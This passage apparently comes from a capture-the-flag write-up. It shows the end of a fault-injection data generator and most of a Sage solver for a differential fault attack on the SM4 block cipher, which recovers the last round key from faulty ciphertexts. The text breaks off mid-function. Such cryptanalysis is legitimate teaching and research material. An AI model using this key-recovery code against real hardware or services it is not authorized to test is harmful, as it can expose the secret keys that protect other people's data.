class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    <span class="comment"># prepared for rk[28]</span></span><br><span class="line">    r -= <span class="number">3</span></span><br><span class="line">    f = <span class="number">0x22</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    f = <span class="number">0x33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">5</span>)):</span><br><span class="line">        m = int.to_bytes(getRandomNBitInteger(<span class="number">128</span>), <span class="number">16</span>, <span class="string">'big'</span>)</span><br><span class="line">        c = encrypt(m)</span><br><span class="line">        c_ast = inject_fault(m, r, f, p)</span><br><span class="line">        c_diff = hexlify(xor(unhexlify(c), unhexlify(c_ast))).decode()</span><br><span class="line">        fw.write(<span class="string">'(&#123;&#125;,&#123;&#125;,&#123;&#125;)\n'</span>.format(c, c_ast, c_diff))</span><br><span class="line">    fw.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>exp_fault.sage</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">get_uint32_be = <span class="keyword">lambda</span> key_data:((key_data[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (key_data[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (key_data[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | (key_data[<span class="number">3</span>]))</span><br><span class="line">put_uint32_be = <span class="keyword">lambda</span> n:[((n&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>), ((n&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>), ((n&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>), ((n)&amp;<span class="number">0xff</span>)]</span><br><span class="line">get_uint128_be = <span class="keyword">lambda</span> key_data:((key_data[<span class="number">0</span>] &lt;&lt; <span class="number">96</span>) | (key_data[<span class="number">1</span>] &lt;&lt; <span class="number">64</span>) | (key_data[<span class="number">2</span>] &lt;&lt; <span class="number">32</span>) | (key_data[<span class="number">3</span>]))</span><br><span class="line">put_uint128_be = <span class="keyword">lambda</span> n:[((n&gt;&gt;<span class="number">96</span>)&amp;<span class="number">0xffffffff</span>), ((n&gt;&gt;<span class="number">64</span>)&amp;<span class="number">0xffffffff</span>), ((n&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>), ((n)&amp;<span class="number">0xffffffff</span>)]</span><br><span class="line">rotl = <span class="keyword">lambda</span> x, n:((x &lt;&lt; n) &amp; <span class="number">0xffffffff</span>) | ((x &gt;&gt; (<span class="number">32</span> - n)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">L = <span class="keyword">lambda</span> y:(y ^^ (rotl(y, <span class="number">2</span>)) ^^ (rotl(y, <span class="number">10</span>)) ^^ (rotl(y, <span class="number">18</span>)) ^^ (rotl(y, <span class="number">24</span>)))</span><br><span class="line"></span><br><span class="line">SM4_FK = [<span class="number">0xa3b1bac6</span>,<span class="number">0x56aa3350</span>,<span class="number">0x677d9197</span>,<span class="number">0xb27022dc</span>]</span><br><span class="line">SM4_CK = [</span><br><span class="line">    <span class="number">0x00070e15</span>,<span class="number">0x1c232a31</span>,<span class="number">0x383f464d</span>,<span class="number">0x545b6269</span>,</span><br><span class="line">    <span class="number">0x70777e85</span>,<span class="number">0x8c939aa1</span>,<span class="number">0xa8afb6bd</span>,<span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>,<span class="number">0xfc030a11</span>,<span class="number">0x181f262d</span>,<span class="number">0x343b4249</span>,</span><br><span class="line">    <span class="number">0x50575e65</span>,<span class="number">0x6c737a81</span>,<span class="number">0x888f969d</span>,<span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>,<span class="number">0xdce3eaf1</span>,<span class="number">0xf8ff060d</span>,<span class="number">0x141b2229</span>,</span><br><span class="line">    <span class="number">0x30373e45</span>,<span class="number">0x4c535a61</span>,<span class="number">0x686f767d</span>,<span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>,<span class="number">0xbcc3cad1</span>,<span class="number">0xd8dfe6ed</span>,<span class="number">0xf4fb0209</span>,</span><br><span class="line">    <span class="number">0x10171e25</span>,<span class="number">0x2c333a41</span>,<span class="number">0x484f565d</span>,<span class="number">0x646b7279</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">generate differential dist for SBOX</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">SM4_BOXES_TABLE = [</span><br><span class="line">    <span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,</span><br><span class="line">    <span class="number">0x05</span>,<span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x06</span>,<span class="number">0x99</span>,<span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,</span><br><span class="line">    <span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,</span><br><span class="line">    <span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,<span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,</span><br><span class="line">    <span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,<span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,</span><br><span class="line">    <span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,<span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,<span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>,<span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,</span><br><span class="line">    <span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,<span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,<span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,</span><br><span class="line">    <span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,<span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,<span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,</span><br><span class="line">    <span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,<span class="number">0x0a</span>,<span class="number">0xc1</span>,</span><br><span class="line">    <span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,<span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0x48</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">diff_dist = dict()</span><br><span class="line"><span class="comment"># initiate dist by set</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        diff_dist[(i, j)] = set()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        pt_diff = i ^^ j</span><br><span class="line">        ct_diff = SM4_BOXES_TABLE[i] ^^ SM4_BOXES_TABLE[j]</span><br><span class="line">        diff_dist[(pt_diff, ct_diff)].add(i)</span><br><span class="line">        diff_dist[(pt_diff, ct_diff)].add(j)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">get data for DFA attack</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">enc_flag, cipher1, cipher2 = <span class="literal">None</span>, [], []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fr:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fr:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            enc_flag = line.strip()</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">1</span> &lt;= i &lt;= <span class="number">10</span>:</span><br><span class="line">            c_data = re.findall(<span class="string">r"\((.*),(.*),(.*)\)"</span>, line)[<span class="number">0</span>]</span><br><span class="line">            ct, ct_ast, ct_diff = c_data[<span class="number">0</span>], c_data[<span class="number">1</span>], c_data[<span class="number">2</span>]</span><br><span class="line">            ct_list = put_uint128_be(int(ct, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            <span class="comment"># ct_ast_list = put_uint128_be(int(ct_ast, 16))[::-1]</span></span><br><span class="line">            ct_diff_list = put_uint128_be(int(ct_diff, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            cipher1.append((get_uint128_be(ct_list), get_uint128_be(ct_diff_list)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c_data = re.findall(<span class="string">r"\((.*),(.*),(.*)\)"</span>, line)[<span class="number">0</span>]</span><br><span class="line">            ct, ct_ast, ct_diff = c_data[<span class="number">0</span>], c_data[<span class="number">1</span>], c_data[<span class="number">2</span>]</span><br><span class="line">            ct_list = put_uint128_be(int(ct, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            ct_ast_list = put_uint128_be(int(ct_ast, <span class="number">16</span>))[::<span class="number">-1</span>]</span><br><span class="line">            cipher2.append((get_uint128_be(ct_list), get_uint128_be(ct_ast_list)))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">COEF prepared for function `inv_L`</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">coef_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    cur_coef_list = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    cur_coef_list[i] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">2</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">10</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">18</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    cur_coef_list[(i + <span class="number">24</span>) % <span class="number">32</span>] = <span class="number">1</span></span><br><span class="line">    coef_list.append(cur_coef_list)</span><br><span class="line">COEF = (Matrix(GF(<span class="number">2</span>), coef_list).T).inverse()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_L</span><span class="params">(ct)</span>:</span></span><br><span class="line">    ct = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(ct)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">'0'</span>)]</span><br><span class="line">    C = Matrix(GF(<span class="number">2</span>), ct)</span><br><span class="line">    M = C * COEF</span><br><span class="line">    mt = int(<span class="string">''</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> M[<span class="number">0</span>]), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mt</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">use a round key to decrypt(only one round)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_one_round</span><span class="params">(cipher, rk)</span>:</span></span><br><span class="line">    cipher_list = put_uint128_be(cipher)</span><br><span class="line">    x = put_uint32_be(cipher_list[<span class="number">0</span>] ^^ cipher_list[<span class="number">1</span>] ^^ cipher_list[<span class="number">2</span>] ^^ rk)</span><br><span class="line">    y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        y.append(SM4_BOXES_TABLE[x[i]])</span><br><span class="line">    y = get_uint32_be(y)</span><br><span class="line">    y = L(y)</span><br><span class="line">    new_cipher_list = [y ^^ cipher_list[<span class="number">3</span>], cipher_list[<span class="number">0</span>], cipher_list[<span class="number">1</span>], cipher_list[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">return</span> get_uint128_be(new_cipher_list)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_key</span><span class="params">(key, i)</span>:</span></span><br><span class="line">    key1, key2, key3, key4 = key[<span class="number">0</span>], key[<span class="number">1</span>], key[<span class="number">2</span>], key[<span class="number">3</span>]</span><br><span class="line">    k_in = put_uint32_be(key1 ^^ key2 ^^ key3 ^^ SM4_CK[i])</span><br><span class="line">    k_out = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        k_out.append(SM4_BOXES_TABLE[k_in[i]])</span><br><span class="line">    k_out = get_uint32_be(k_out)</span><br><span class="line">    k_out = k_out ^^ (rotl(k_out, <span class="number">13</span>)) ^^ (rotl(k_out, <span class="number">23</span>))</span><br><span class="line">    key0 = key4 ^^ k_out</span><br><span class="line">    <span class="keyword">return</span> key0</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_31</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher1</span><br><span class="line">    key_31 = [set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>)), set(range(<span class="number">0x100</span>))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000022</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = put_uint32_be(ct_list[<span class="number">0</span>] ^^ ct_list[<span class="number">1</span>] ^^ ct_list[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            key_31_candidate = set()</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> diff_dist[(x_diff[j], y_diff[j])]:</span><br><span class="line">                key_31_candidate.add(x[j] ^^ _)</span><br><span class="line">            key_31[j] = key_31[j] &amp; key_31_candidate</span><br><span class="line">        status = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> len(key_31[j]) &gt; <span class="number">2</span>:</span><br><span class="line">                status = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">        ct, ct_diff = cipher1[i][<span class="number">0</span>], cipher1[i][<span class="number">1</span>]</span><br><span class="line">        ct_list = put_uint128_be(ct)</span><br><span class="line">        ct_diff_list = put_uint128_be(ct_diff)</span><br><span class="line">        y_diff = put_uint32_be(inv_L(ct_diff_list[<span class="number">3</span>] ^^ <span class="number">0x00000033</span>))</span><br><span class="line">        x_diff = put_uint32_be(ct_diff_list[<span class="number">0</span>] ^^ ct_diff_list[<span class="number">1</span>] ^^ ct_diff_list[<span class="number">2</span>])</span><br><span class="line">        x = 